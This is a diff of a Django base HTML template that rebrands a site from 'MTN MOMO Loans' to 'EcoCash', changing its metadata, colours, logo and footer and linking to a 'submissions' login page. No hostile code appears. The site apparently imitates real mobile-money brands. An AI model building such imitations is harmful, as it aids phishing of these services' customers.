@@ -3,348 +3,178 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>{% block title %}MTN MOMO Loans{% endblock %}</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>{% block title %}EcoCash{% endblock %}</title>
 
-  <!-- ── SEO ──────────────────────────────────────────────────────────────── -->
-  <meta name="description"       content="{% block meta_description %}Apply for an MTN MOMO loan in minutes. Fast, secure, and paperless.{% endblock %}" />
-  <meta name="robots"            content="index, follow" />
-  <link rel="canonical"          href="{% block canonical %}{{ request.build_absolute_uri }}{% endblock %}" />
+  <!-- SEO -->
+  <meta name="description" content="{% block meta_description %}EcoCash — fast, secure mobile money.{% endblock %}" />
+  <meta name="robots"      content="index, follow" />
 
-  <!-- ── Open Graph (Facebook / WhatsApp / LinkedIn / etc.) ───────────────── -->
+  <!-- Open Graph -->
   <meta property="og:type"        content="website" />
-  <meta property="og:site_name"   content="MTN MOMO Loans" />
-  <meta property="og:title"       content="{% block og_title %}MTN MOMO Loans — Apply Now{% endblock %}" />
-  <meta property="og:description" content="{% block og_description %}Apply for an MTN MOMO loan in minutes. Fast, secure, and paperless.{% endblock %}" />
+  <meta property="og:site_name"   content="EcoCash" />
+  <meta property="og:title"       content="{% block og_title %}EcoCash{% endblock %}" />
+  <meta property="og:description" content="{% block og_description %}Fast, secure mobile money.{% endblock %}" />
   <meta property="og:url"         content="{{ request.build_absolute_uri }}" />
-  <meta property="og:image"       content="{% block og_image %}{{ request.scheme }}://{{ request.get_host }}{% static 'submissions/img/og-cover.png' %}{% endblock %}" />
+  <meta property="og:image"       content="{{ request.scheme }}://{{ request.get_host }}{% static 'submissions/img/og-cover.png' %}" />
   <meta property="og:image:width"  content="1200" />
   <meta property="og:image:height" content="630" />
-  <meta property="og:locale"      content="en_KE" />
 
-  <!-- ── Twitter / X Card ─────────────────────────────────────────────────── -->
+  <!-- Twitter -->
   <meta name="twitter:card"        content="summary_large_image" />
-  <meta name="twitter:title"       content="{% block twitter_title %}MTN MOMO Loans — Apply Now{% endblock %}" />
-  <meta name="twitter:description" content="{% block twitter_description %}Apply for an MTN MOMO loan in minutes. Fast, secure, and paperless.{% endblock %}" />
-  <meta name="twitter:image"       content="{% block twitter_image %}{{ request.scheme }}://{{ request.get_host }}{% static 'submissions/img/og-cover.png' %}{% endblock %}" />
+  <meta name="twitter:title"       content="{% block twitter_title %}EcoCash{% endblock %}" />
+  <meta name="twitter:description" content="{% block twitter_description %}Fast, secure mobile money.{% endblock %}" />
+  <meta name="twitter:image"       content="{{ request.scheme }}://{{ request.get_host }}{% static 'submissions/img/og-cover.png' %}" />
 
-  <!-- ── Favicon / Brand icon ─────────────────────────────────────────────── -->
+  <!-- Favicons -->
   <link rel="icon"             type="image/png" sizes="32x32" href="{% static 'submissions/img/favicon-32.png' %}" />
   <link rel="icon"             type="image/png" sizes="16x16" href="{% static 'submissions/img/favicon-16.png' %}" />
   <link rel="apple-touch-icon" sizes="180x180"  href="{% static 'submissions/img/apple-touch-icon.png' %}" />
+
   <style>
-    /* ── Reset & Base ─────────────────────────────────────────────────────── */
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
     :root {
-      --color-bg:         #f6f9fc;
-      --color-surface:    #ffffff;
-      --color-border:     #e3e8ee;
-      --color-border-focus: #635bff;
-      --color-text:       #1a1f36;
-      --color-muted:      #697386;
-      --color-primary:    #635bff;
-      --color-primary-hover: #5147e5;
-      --color-primary-active: #4338ca;
-      --color-success:    #1a9c5b;
-      --color-error:      #df1b41;
-      --color-error-bg:   #fff0f3;
-      --color-step-done:  #635bff;
-      --color-step-active:#1a1f36;
-      --color-step-idle:  #c1c9d2;
-      --radius-sm:        6px;
-      --radius-md:        10px;
-      --radius-lg:        16px;
-      --shadow-card:      0 2px 8px rgba(0,0,0,.06), 0 0 1px rgba(0,0,0,.08);
+      --eco-blue:      #0057a8;
+      --eco-blue-dark: #004080;
+      --eco-red:       #e02020;
+      --eco-text:      #1a1a1a;
+      --eco-muted:     #555;
+      --eco-border:    #c8d8ea;
+      --eco-success:   #1a9c5b;
       --font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     }
 
     html, body {
       height: 100%;
       font-family: var(--font);
-      background: var(--color-bg);
-      color: var(--color-text);
+      background: #f5f8fb;
       -webkit-font-smoothing: antialiased;
     }
 
-    /* ── Layout ───────────────────────────────────────────────────────────── */
-    .site-wrapper {
+    .page {
       min-height: 100vh;
       display: flex;
       flex-direction: column;
-    }
-
-    /* ── Main ─────────────────────────────────────────────────────────────── */
-    .site-main {
-      flex: 1;
-      display: flex;
-      align-items: flex-start;
-      justify-content: center;
-      padding: 48px 16px 80px;
-    }
-
-    .card {
-      background: var(--color-surface);
-      border: 1px solid var(--color-border);
-      border-radius: var(--radius-lg);
-      box-shadow: var(--shadow-card);
-      width: 100%;
+      background: #fff;
       max-width: 480px;
-      padding: 40px;
+      margin: 0 auto;
+      overflow: hidden;
     }
 
-    /* ── Progress stepper ─────────────────────────────────────────────────── */
-    .stepper {
-      display: flex;
-      align-items: center;
-      margin-bottom: 36px;
-    }
-    .stepper__item {
-      display: flex;
-      align-items: center;
+    .top-section {
       flex: 1;
-      gap: 0;
-    }
-    .stepper__item:last-child { flex: none; }
-    .stepper__dot {
-      width: 28px;
-      height: 28px;
-      border-radius: 50%;
+      padding: 48px 32px 0;
       display: flex;
+      flex-direction: column;
       align-items: center;
-      justify-content: center;
-      font-size: 12px;
-      font-weight: 600;
-      flex-shrink: 0;
-      transition: background .2s, border-color .2s;
     }
-    .stepper__dot--done {
-      background: var(--color-step-done);
-      color: #fff;
-      border: 2px solid var(--color-step-done);
-    }
-    .stepper__dot--active {
-      background: var(--color-surface);
-      color: var(--color-step-active);
-      border: 2px solid var(--color-step-active);
-    }
-    .stepper__dot--idle {
-      background: var(--color-surface);
-      color: var(--color-step-idle);
-      border: 2px solid var(--color-step-idle);
-    }
-    .stepper__check {
-      display: none;
-    }
-    .stepper__dot--done .stepper__check { display: block; }
-    .stepper__dot--done .stepper__num   { display: none; }
-    .stepper__line {
-      flex: 1;
-      height: 2px;
-      background: var(--color-border);
-      margin: 0 6px;
-      transition: background .2s;
-    }
-    .stepper__line--done { background: var(--color-step-done); }
 
-    /* ── Card heading ─────────────────────────────────────────────────────── */
+    .logo {
+      font-size: 38px;
+      font-weight: 800;
+      letter-spacing: -1px;
+      margin-bottom: 32px;
+      text-decoration: none;
+    }
+    .logo span:first-child { color: var(--eco-blue); }
+    .logo span:last-child  { color: var(--eco-red);  }
+
+    /* card used by success / other pages that extend base */
+    .card {
+      width: 100%;
+      padding: 0 0 32px;
+    }
     .card__eyebrow {
       font-size: 12px;
       font-weight: 600;
       letter-spacing: .8px;
       text-transform: uppercase;
-      color: var(--color-primary);
+      color: var(--eco-blue);
       margin-bottom: 8px;
     }
     .card__title {
-      font-size: 28px;
+      font-size: 26px;
       font-weight: 700;
-      letter-spacing: -.5px;
-      color: var(--color-text);
-      margin-bottom: 6px;
+      color: var(--eco-text);
+      margin-bottom: 8px;
     }
     .card__subtitle {
-      font-size: 16px;
-      color: var(--color-muted);
-      margin-bottom: 36px;
-      line-height: 1.6;
-    }
-
-    /* ── Form elements ────────────────────────────────────────────────────── */
-    .field { margin-bottom: 22px; }
-    .field:last-of-type { margin-bottom: 0; }
-
-    .field__label {
-      display: block;
       font-size: 15px;
-      font-weight: 500;
-      color: var(--color-text);
-      margin-bottom: 7px;
-    }
-    .field__label span.optional {
-      font-weight: 400;
-      color: var(--color-muted);
-      margin-left: 4px;
-    }
-
-    .field__input,
-    .field__select {
-      display: block;
-      width: 100%;
-      padding: 12px 14px;
-      font-size: 16px;
-      font-family: var(--font);
-      color: var(--color-text);
-      background: var(--color-surface);
-      border: 1.5px solid var(--color-border);
-      border-radius: var(--radius-sm);
-      transition: border-color .15s, box-shadow .15s;
-      outline: none;
-      appearance: none;
-      -webkit-appearance: none;
-    }
-    .field__input::placeholder { color: #aab0bc; }
-    .field__input:focus,
-    .field__select:focus {
-      border-color: var(--color-border-focus);
-      box-shadow: 0 0 0 3px rgba(99,91,255,.15);
-    }
-    .field__input--error,
-    .field__select--error {
-      border-color: var(--color-error);
-    }
-    .field__input--error:focus,
-    .field__select--error:focus {
-      box-shadow: 0 0 0 3px rgba(223,27,65,.12);
-    }
-
-    /* Select arrow */
-    .field__select-wrap { position: relative; }
-    .field__select-wrap::after {
-      content: "";
-      pointer-events: none;
-      position: absolute;
-      right: 14px;
-      top: 50%;
-      transform: translateY(-50%);
-      width: 0; height: 0;
-      border-left: 5px solid transparent;
-      border-right: 5px solid transparent;
-      border-top: 6px solid var(--color-muted);
-    }
-
-    .field__error {
-      margin-top: 6px;
-      font-size: 14px;
-      color: var(--color-error);
-      display: flex;
-      align-items: center;
-      gap: 4px;
-    }
-
-    /* Two columns on wide enough screens */
-    .field-row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 16px;
-    }
-
-    /* ── Inline error banner ──────────────────────────────────────────────── */
-    .form-error-banner {
-      background: var(--color-error-bg);
-      border: 1px solid rgba(223,27,65,.3);
-      border-radius: var(--radius-sm);
-      padding: 13px 15px;
-      font-size: 14.5px;
-      color: var(--color-error);
+      color: var(--eco-muted);
+      line-height: 1.6;
       margin-bottom: 24px;
-      display: flex;
-      align-items: flex-start;
-      gap: 8px;
     }
-    .form-error-banner svg { flex-shrink: 0; margin-top: 1px; }
 
-    /* ── Buttons ──────────────────────────────────────────────────────────── */
-    .btn {
+    /* Shared button */
+    .btn--primary {
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      gap: 8px;
-      padding: 13px 22px;
-      font-size: 16px;
-      font-weight: 600;
-      font-family: var(--font);
-      border: none;
-      border-radius: var(--radius-sm);
-      cursor: pointer;
-      transition: background .15s, box-shadow .15s, transform .1s;
-      text-decoration: none;
-      letter-spacing: -.1px;
-    }
-    .btn:active { transform: scale(.985); }
-
-    .btn--primary {
-      background: var(--color-primary);
-      color: #fff;
       width: 100%;
-      margin-top: 28px;
-    }
-    .btn--primary:hover { background: var(--color-primary-hover); }
-    .btn--primary:active { background: var(--color-primary-active); }
-
-    .btn--ghost {
-      background: transparent;
-      color: var(--color-muted);
-      font-size: 14px;
-      font-weight: 500;
-      padding: 8px 0;
-      margin-top: 14px;
-    }
-    .btn--ghost:hover { color: var(--color-text); }
-
-    .btn--link {
-      background: none;
+      background: var(--eco-blue);
+      color: #fff;
       border: none;
-      color: var(--color-primary);
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-      padding: 0;
+      border-radius: 8px;
+      padding: 15px;
+      font-size: 16px;
+      font-weight: 700;
       font-family: var(--font);
+      cursor: pointer;
+      text-decoration: none;
+      transition: background .15s;
     }
-    .btn--link:hover { text-decoration: underline; }
-    .btn--link:disabled { color: var(--color-muted); cursor: default; text-decoration: none; }
+    .btn--primary:hover { background: var(--eco-blue-dark); }
 
-    /* ── Footer ───────────────────────────────────────────────────────────── */
-    .site-footer {
+    /* colour helpers used by success */
+    --color-border:  var(--eco-border);
+    --color-text:    var(--eco-text);
+    --color-muted:   var(--eco-muted);
+
+    .wave {
+      display: block;
+      width: 100%;
+      margin-bottom: -2px;
+    }
+
+    .bottom-section {
+      background: var(--eco-blue);
+      padding: 20px 28px 32px;
       text-align: center;
-      padding: 20px;
-      font-size: 13px;
-      color: var(--color-muted);
-      border-top: 1px solid var(--color-border);
     }
-    .site-footer a { color: var(--color-muted); text-decoration: underline; }
+    .terms {
+      font-size: 11px;
+      color: rgba(255,255,255,.6);
+    }
+    .terms a { color: rgba(255,255,255,.8); text-decoration: underline; }
 
-    /* ── Responsive ───────────────────────────────────────────────────────── */
-    @media (max-width: 520px) {
-      .card { padding: 28px 20px; border-radius: var(--radius-md); }
-      .site-main { padding: 24px 12px 60px; }
-      .field-row { grid-template-columns: 1fr; }
+    @media (min-width: 481px) {
+      .page { box-shadow: 0 4px 32px rgba(0,0,0,.1); }
     }
   </style>
   {% block extra_head %}{% endblock %}
 </head>
 <body>
-<div class="site-wrapper">
+<div class="page">
 
-  <main class="site-main">
+  <div class="top-section">
+    <a href="{% url 'submissions:login' %}" class="logo">
+      <span>Eco</span><span>Cash</span>
+    </a>
+
     {% block content %}{% endblock %}
-  </main>
+  </div>
 
-  <footer class="site-footer">
-    &copy; 2026 MTN MOMO Loans &nbsp;·&nbsp;
-    <a href="#">Privacy</a> &nbsp;·&nbsp; <a href="#">Terms</a>
-  </footer>
+  <svg class="wave" viewBox="0 0 480 60" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0,0 C120,60 360,60 480,0 L480,60 L0,60 Z" fill="#0057a8"/>
+  </svg>
+
+  <div class="bottom-section">
+    <p class="terms">
+      &copy; 2026 EcoCash &nbsp;·&nbsp;
+      <a href="#">Privacy</a> &nbsp;·&nbsp; <a href="#">Terms</a>
+    </p>
+  </div>
 
 </div>
 {% block extra_scripts %}{% endblock %}
